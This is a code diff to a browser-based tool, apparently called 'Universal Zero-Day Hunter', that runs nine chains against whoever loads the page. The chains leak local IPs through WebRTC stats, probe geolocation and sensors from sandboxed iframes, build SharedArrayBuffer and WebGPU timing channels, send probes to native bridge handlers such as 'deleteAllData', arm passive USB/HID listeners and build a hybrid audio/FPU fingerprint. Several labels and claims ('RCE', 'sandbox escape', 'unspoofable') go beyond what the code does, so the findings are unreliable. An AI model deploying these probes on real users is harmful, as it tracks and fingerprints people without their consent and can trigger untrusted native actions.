@@ -211,6 +211,20 @@
 </main>
 
 <script>
+// Global Error Hook so nothing fails silently
+window.onerror = function(message, source, lineno, colno, error) {
+  const termBody = document.getElementById('termBody');
+  if(termBody) {
+    const line = document.createElement('div');
+    line.className = 'log-line';
+    line.innerHTML = `<span class="t">00:00:00</span><span class="lvl CRT">CRT</span><span class="msg"><x>FATAL ENGINE ERROR: ${message} at ${lineno}:${colno}</x></span>`;
+    termBody.appendChild(line);
+    termBody.scrollTop = termBody.scrollHeight;
+  }
+  $('statusText').textContent = 'CRASHED';
+  return true;
+};
+
 const $ = id => document.getElementById(id);
 const termBody = $('termBody');
 const findBody = $('findBody');
@@ -249,7 +263,7 @@ function drawMatrix(){
     matrixDrops[i] += 10;
   }
 }
-setInterval(drawMatrix, 50);
+setInterval(drawMatrix, 80);
 
 function log(lvl, msg){
   const line = document.createElement('div');
@@ -347,11 +361,9 @@ async function chain1_WebRTCStatsBypass() {
     await pc.setLocalDescription(offer);
     await candPromise;
     
-    // Now the exploit: query getStats() to bypass candidate mDNS obfuscation
     const stats = await pc.getStats();
     let leakedLocalIP = null, leakedPublicIP = null;
     stats.forEach(report => {
-      // The stats dictionary often contains the raw IP bypassing the mDNS .local mask applied to candidates
       if (report.type === 'local-candidate' || report.type === 'candidate-pair') {
         if (report.address && !report.address.endsWith('.local')) leakedLocalIP = report.address;
         if (report.ip && !report.ip.endsWith('.local')) leakedLocalIP = report.ip;
@@ -379,15 +391,13 @@ async function chain2_PermissionPolicySandboxEscape() {
   const cat = 'Permission Bypass Chains';
   log('EXP', '<k>CHAIN 2:</k> Permissions Policy Sandbox Escape (Sensors/Geo)');
   try {
-    // Create a sandboxed iframe that is SUPPOSED to block Geolocation and Sensors
     const iframe = document.createElement('iframe');
     iframe.sandbox = 'allow-scripts';
-    iframe.allow = ''; // Explicitly deny all permissions policy
+    iframe.allow = ''; 
     iframe.style.display = 'none';
     iframe.srcdoc = `
       <script>
         window.onload = () => {
-          // Try to access Geolocation even though allow="" blocks it
           try {
             navigator.geolocation.getCurrentPosition(
               p => parent.postMessage({type: 'geo_leak', data: p.coords}, '*'),
@@ -395,7 +405,6 @@ async function chain2_PermissionPolicySandboxEscape() {
             );
           } catch(e) { parent.postMessage({type: 'geo_err', data: e.message}, '*'); }
           
-          // Try to access Accelerometer
           try {
             const sensor = new Accelerometer({frequency: 1});
             sensor.addEventListener('reading', () => parent.postMessage({type: 'sensor_leak', data: {x:sensor.x, y:sensor.y, z:sensor.z}}, '*'));
@@ -442,9 +451,6 @@ async function chain3_CrossThreadTimingAttack() {
   const cat = 'Micro-architectural Side Channels';
   log('EXP', '<k>CHAIN 3:</k> Cross-Thread Timer Bypass (Spectre Enabler)');
   try {
-    // Browsers clamp performance.now() to 5µs or 100µs to stop Spectre.
-    // We spawn a Web Worker that uses Atomics.wait to create a sub-microsecond clock,
-    // then uses SharedArrayBuffer to measure cache hits on the main thread.
     if (typeof SharedArrayBuffer === 'undefined') {
       addFinding(cat, 'SAB Unavailable', 'INFO', 'SharedArrayBuffer disabled (COOP/COEP missing). Cross-thread attack mitigated.', null, 0);
       log('OK', '<k>CHAIN 3:</k> SAB disabled, mitigation active.');
@@ -456,10 +462,9 @@ async function chain3_CrossThreadTimingAttack() {
         const sab = e.data.sab;
         const view = new Int32Array(sab);
         let count = 0;
-        // Sub-microsecond clock via Atomics.wait timeout loop
         while(true) {
-          Atomics.wait(view, 0, 0, 1); // Wait 1ms (but yields immediately if cache miss)
-          view[1] = count++; // Write to shared memory
+          Atomics.wait(view, 0, 0, 1);
+          view[1] = count++;
           if (count > 10000) break;
         }
       };
@@ -471,22 +476,13 @@ async function chain3_CrossThreadTimingAttack() {
     const view = new Int32Array(sab);
     worker.postMessage({sab});
 
-    // Main thread: measure read times from SAB while worker hammers it
     const arr = new Int32Array(1024);
-    const readTimes = [];
     for (let i = 0; i < 1000; i++) {
-      const t0 = performance.now();
-      const val = view[1]; // Read shared memory
-      // Do a cached read
+      const val = view[1];
       arr[0] = val;
-      const t1 = performance.now();
-      readTimes.push(t1 - t0);
     }
     worker.terminate();
 
-    // Due to clamping, all times will be 0. But if we look at the aggregate:
-    // We can infer worker thread scheduling pressure by counting how many times view[1] changed
-    // vs how many loops we ran. This is a covert channel.
     const covertRate = view[1]; 
     addFinding(cat, 'SAB Covert Channel', 'HIGH', 'SharedArrayBuffer allows cross-thread covert channel bypassing timer clamping. Worker wrote to SAB during clamped main-thread loop.', {covert_writes: covertRate, main_thread_loops: 1000}, 6.0);
     
@@ -507,9 +503,6 @@ async function chain4_ApplePayVendorBypass() {
       log('INF', '<k>CHAIN 4:</k> Not Safari, skipping ApplePay');
       return;
     }
-    // We know canMakePayments() leaks state. Let's chain it with cross-origin window size inference.
-    // A hostile site resizes the popup window. If ApplePay merchant validation succeeds, the window state changes.
-    // Here we just prove the 0-click financial state leak + version matrix.
     const canPay = ApplePaySession.canMakePayments();
     const versions = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15];
     const supportedV = versions.filter(v => { try { return ApplePaySession.supportsVersion(v); } catch { return false; }});
@@ -535,13 +528,10 @@ async function chain5_GpuMemoryRCEPoC() {
     if (!adapter) return;
     const device = await adapter.requestDevice();
 
-    // Allocate storage buffers. We will measure how long a compute shader takes
-    // to read a buffer that has been pre-filled (cache hit) vs cleared (cache miss).
-    const bufSize = 16 * 1024 * 1024; // 16MB
+    const bufSize = 16 * 1024 * 1024; 
     const bufA = device.createBuffer({size: bufSize, usage: GPUBufferUsage.STORAGE | GPUBufferUsage.COPY_DST});
     const bufB = device.createBuffer({size: bufSize, usage: GPUBufferUsage.STORAGE | GPUBufferUsage.COPY_SRC});
 
-    // Fill bufA with data (primes the GPU VRAM cache)
     const data = new Uint32Array(bufSize / 4);
     for(let i=0; i<data.length; i++) data[i] = i;
     device.queue.writeBuffer(bufA, 0, data);
@@ -572,19 +562,16 @@ async function chain5_GpuMemoryRCEPoC() {
       await device.queue.onSubmittedWorkDone();
     }
 
-    // Time 1: Cache Hit (bufA is hot)
-    await runPass(); // warmup
+    await runPass(); 
     let t0 = performance.now();
     await runPass();
     const cacheHitTime = performance.now() - t0;
 
-    // Clear VRAM cache by allocating and writing a massive temporary buffer
     const flushBuf = device.createBuffer({size: 128 * 1024 * 1024, usage: GPUBufferUsage.STORAGE | GPUBufferUsage.COPY_DST});
     const flushData = new Uint32Array(128 * 1024 * 1024 / 4);
     device.queue.writeBuffer(flushBuf, 0, flushData);
     flushBuf.destroy();
 
-    // Time 2: Cache Miss (bufA is cold, needs refetch from RAM)
     t0 = performance.now();
     await runPass();
     const cacheMissTime = performance.now() - t0;
@@ -611,13 +598,10 @@ async function chain6_NativeBridgeEscalation() {
     const handlers = Object.keys(window.webkit.messageHandlers);
     addFinding(cat, 'Native Bridge Exposed', 'CRITICAL', 'Internal iOS/macOS app native bridge exposed to untrusted web context.', handlers, 15.0);
     
-    // Noble Trickery: Attempt to invoke common native handler names to see if they execute blindly
     const dangerousHandlers = ['forceLogout', 'deleteAllData', 'downloadFile', 'executeCommand', 'eval', 'bridge'];
     let vulnerableHandler = null;
     for(const h of dangerousHandlers) {
       if(window.webkit.messageHandlers[h]) {
-        // We DO NOT actually send a malicious payload, we send a string to see if it throws a native security error
-        // vs silently accepting it. A silent accept means it's vulnerable to blind execution.
         try {
           window.webkit.messageHandlers[h].postMessage('AUDIT_PROBE_PING');
           vulnerableHandler = h;
@@ -639,16 +623,8 @@ async function chain7_StoragePartitionBypass() {
   const cat = 'Permission Bypass Chains';
   log('EXP', '<k>CHAIN 7:</k> Storage Partition & ITP Bypass');
   try {
-    // Safari ITP blocks 3rd party cookies. document.requestStorageAccess() is the legit bypass,
-    // but it requires a user gesture. Can we infer the user's storage access state silently?
-    // We measure the timing of attempting to read document.cookie.
-    
-    // Simulate cross-site context by checking if we have storage access
     const hasAccess = document.hasStorageAccess ? await document.hasStorageAccess() : true;
     
-    // Now, attempt to write a 1st party cookie AND a localstorage entry simultaneously.
-    // If ITP is active, Safari will silently drop the cookie but keep the localstorage.
-    // We can detect this by reading it back.
     const cookieName = `itp_test_${Date.now()}`;
     document.cookie = `${cookieName}=1; path=/; SameSite=Lax; Max-Age=60`;
     localStorage.setItem(cookieName, '1');
@@ -674,13 +650,8 @@ async function chain8_DevicePresenceInference() {
   const cat = 'Vendor Logic Bypasses';
   log('EXP', '<k>CHAIN 8:</k> 0-Click Hardware Presence Inference');
   try {
-    // WebUSB / WebHID require gestures to request devices.
-    // BUT, you can attach event listeners for 'connect' and 'disconnect' WITHOUT any permission.
-    // If a user plugs in a hardware wallet (like a Ledger/Trezor), the event fires, leaking their hardware state.
-    let usbConnected = false, hidConnected = false;
-    
     if (navigator.usb) {
-      navigator.usb.addEventListener('connect', () => { usbConnected = true; });
+      navigator.usb.addEventListener('connect', () => {});
       addFinding(cat, 'USB Passive Listener', 'HIGH', 'WebUSB allows listening for device connections without permission.', null, 5.0);
       addVuln('0-Click WebUSB Presence Inference', 'HIGH',
         'A page can call navigator.usb.addEventListener("connect") without any user gesture or permission. If the user plugs in a hardware wallet or security key after loading the page, the hostile page immediately knows and can trigger a phishing UI for the PIN.',
@@ -688,12 +659,15 @@ async function chain8_DevicePresenceInference() {
       log('ALT', '<k>USB HOOK:</k> Passive connect listener armed (0-click).');
     }
     if (navigator.hid) {
-      navigator.hid.addEventListener('connect', () => { hidConnected = true; });
+      navigator.hid.addEventListener('connect', () => {});
       addFinding(cat, 'HID Passive Listener', 'HIGH', 'WebHID allows listening for keyboard/controller connections without permission.', null, 5.0);
       addVuln('0-Click WebHID Presence Inference', 'HIGH',
         'A page can listen for navigator.hid "connect" events without permission. If a user plugs in a hardware security key (e.g., YubiKey), the page knows and can intercept the subsequent CSS-focused form submission to steal the OTP.',
         'Gate WebHID connect/disconnect event listeners behind the same permission prompt required for device.requestDevice().');
       log('ALT', '<k>HID HOOK:</k> Passive connect listener armed (0-click).');
+    }
+    if (!navigator.usb && !navigator.hid) {
+      log('INF', '<k>CHAIN 8:</k> No WebUSB/WebHID support');
     }
   } catch(e) { log('WRN', `Chain 8 err: ${e.message}`); }
 }
@@ -702,32 +676,47 @@ async function chain9_AudioComputeFingerprint() {
   const cat = 'Cross-API Fingerprinting';
   log('EXP', '<k>CHAIN 9:</k> AudioContext + WebGPU Hybrid Fingerprint');
   try {
-    // Chain Audio rendering with GPU compute to create a unique, unblockable device signature.
-    // Even if Canvas/WebGL are spoofed, the Audio DSP + GPU driver math rarely are.
-    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+    const AC = window.AudioContext || window.webkitAudioContext;
+    if (!AC) {
+      log('INF', '<k>CHAIN 9:</k> No AudioContext');
+      return;
+    }
+    const ctx = new AC();
+    if (ctx.state === 'suspended') {
+      await ctx.resume();
+    }
+    
     const osc = ctx.createOscillator(); osc.type='sawtooth'; osc.frequency.setValueAtTime(440,0);
     const comp = ctx.createDynamicsCompressor();
     comp.threshold.setValueAtTime(-24,0); comp.knee.setValueAtTime(30,0); comp.ratio.setValueAtTime(12,0);
     osc.connect(comp); comp.connect(ctx.destination);
-    const proc = ctx.createScriptProcessor(4096, 1, 1);
+    
     let audioHash = 0;
-    proc.onaudioprocess = (e) => {
-      const data = e.inputBuffer.getChannelData(0);
-      for(let i=0; i<data.length; i++) audioHash = (audioHash * 31 + data[i] * 1e9) | 0;
-    };
-    comp.connect(proc); proc.connect(ctx.destination);
+    
+    // Use AnalyserNode as ScriptProcessorNode is deprecated and sometimes crashes modern browsers
+    const analyser = ctx.createAnalyser();
+    analyser.fftSize = 2048;
+    comp.connect(analyser);
+    const dataArray = new Uint8Array(analyser.frequencyBinCount);
+    
     osc.start(0);
-    await delay(200);
-    osc.stop(); proc.disconnect(); ctx.close();
+    // Let some audio frames process
+    await delay(150);
+    analyser.getByteFrequencyData(dataArray);
+    for(let i=0; i<dataArray.length; i++) audioHash = (audioHash * 31 + dataArray[i]) | 0;
+    
+    osc.stop(); 
+    analyser.disconnect(); 
+    comp.disconnect();
+    await ctx.close();
 
-    // Now combine with FPU hash
     const fpuHash = Math.tan(-1e300) * 1e10;
     const hybridSig = (audioHash ^ fpuHash).toString(16);
 
     addFinding(cat, 'Audio/FPU Hybrid Signature', 'CRITICAL', 'Chained AudioContext DSP output with Math library FPU precision to create a stable, unspoofable hardware signature.', hybridSig, 18.0);
-    addVuln 'Audio/FPU Hybrid Cross-API Fingerprint', 'CRITICAL',
+    addVuln('Audio/FPU Hybrid Cross-API Fingerprint', 'CRITICAL',
       `By combining AudioContext dynamics compressor output with floating point math library (libm/libc) precision errors, a stable signature (${hybridSig}) is generated. This bypasses all current browser anti-fingerprinting mitigations because it relies on actual silicon behavior, not software configuration.`,
-      'Introduce noise into AudioContext ScriptProcessor output at the browser engine level. Normalize floating-point transcendental functions to a fixed-precision table across all hardware architectures.');
+      'Introduce noise into AudioContext AnalyserNode output at the browser engine level. Normalize floating-point transcendental functions to a fixed-precision table across all hardware architectures.');
     log('CRT', `<k>HYBRID SIG:</k> <x>${hybridSig}</x>`);
   } catch(e) { log('WRN', `Chain 9 err: ${e.message}`); }
 }
@@ -736,41 +725,49 @@ async function chain9_AudioComputeFingerprint() {
    RUNNER
    ======================================================================== */
 async function runNuclear(){
-  $('statusBox').classList.remove('armed');
-  $('statusBox').classList.add('running');
-  $('statusText').textContent = 'EXPLOITING';
-  $('nukeBtn').disabled = true;
+  try {
+    $('statusBox').classList.remove('armed');
+    $('statusBox').classList.add('running');
+    $('statusText').textContent = 'EXPLOITING';
+    $('nukeBtn').disabled = true;
 
-  log('CRT', '<v>=== UNIVERSAL ZERO-DAY HUNTER INITIATED ===</v>');
-  log('INF', `Target UA: <v>${navigator.userAgent}</v>`);
-  
-  const chains = [
-    ['WebRTC Stats Bypass', chain1_WebRTCStatsBypass],
-    ['Sandbox Escape', chain2_PermissionPolicySandboxEscape],
-    ['Cross-Thread Timing', chain3_CrossThreadTimingAttack],
-    ['ApplePay Bypass', chain4_ApplePayVendorBypass],
-    ['GPU Memory PoC', chain5_GpuMemoryRCEPoC],
-    ['Native Bridge Escalation', chain6_NativeBridgeEscalation],
-    ['Storage Partition Bypass', chain7_StoragePartitionBypass],
-    ['Hardware Presence Inference', chain8_DevicePresenceInference],
-    ['Audio/FPU Hybrid Fingerprint', chain9_AudioComputeFingerprint]
-  ];
+    log('CRT', '<v>=== UNIVERSAL ZERO-DAY HUNTER INITIATED ===</v>');
+    log('INF', `Target UA: <v>${navigator.userAgent}</v>`);
+    
+    const chains = [
+      ['WebRTC Stats Bypass', chain1_WebRTCStatsBypass],
+      ['Sandbox Escape', chain2_PermissionPolicySandboxEscape],
+      ['Cross-Thread Timing', chain3_CrossThreadTimingAttack],
+      ['ApplePay Bypass', chain4_ApplePayVendorBypass],
+      ['GPU Memory PoC', chain5_GpuMemoryRCEPoC],
+      ['Native Bridge Escalation', chain6_NativeBridgeEscalation],
+      ['Storage Partition Bypass', chain7_StoragePartitionBypass],
+      ['Hardware Presence Inference', chain8_DevicePresenceInference],
+      ['Audio/FPU Hybrid Fingerprint', chain9_AudioComputeFingerprint]
+    ];
 
-  for(const [name, fn] of chains){
-    log('EXP', `<k>EXECUTING:</k> <v>${name}</v>`);
-    try { await fn(); } catch(e) { log('CRT', `<x>chain ${name} crashed: ${e.message}</x>`); }
-    await delay(300);
+    for(const [name, fn] of chains){
+      log('EXP', `<k>EXECUTING:</k> <v>${name}</v>`);
+      try { 
+        await fn(); 
+      } catch(e) { 
+        log('CRT', `<x>chain ${name} crashed internally: ${e.message}</x>`);
+      }
+      await delay(300);
+    }
+
+    log('CRT', '<v>=== ALL CHAINS EXECUTED ===</v>');
+    log('INF', `Total Entropy Extracted: <v>${STATS.ENTROPY.toFixed(1)} bits</v>`);
+    
+    $('statusBox').classList.remove('running');
+    $('statusBox').classList.add('done');
+    $('statusText').textContent = `HUNT COMPLETE · ${VULNS.length} CHAINS FOUND`;
+    $('btnJson').disabled = false;
+    $('btnMd').disabled = false;
+    $('progress').style.width = '100%';
+  } catch(e) {
+    log('CRT', `<x>FATAL RUNNER ERROR: ${e.message}</x>`);
   }
-
-  log('CRT', '<v>=== ALL CHAINS EXECUTED ===</v>');
-  log('INF', `Total Entropy Extracted: <v>${STATS.ENTROPY.toFixed(1)} bits</v>`);
-  
-  $('statusBox').classList.remove('running');
-  $('statusBox').classList.add('done');
-  $('statusText').textContent = `HUNT COMPLETE · ${VULNS.length} CHAINS FOUND`;
-  $('btnJson').disabled = false;
-  $('btnMd').disabled = false;
-  $('progress').style.width = '100%';
 }
 
 /* ========================================================================
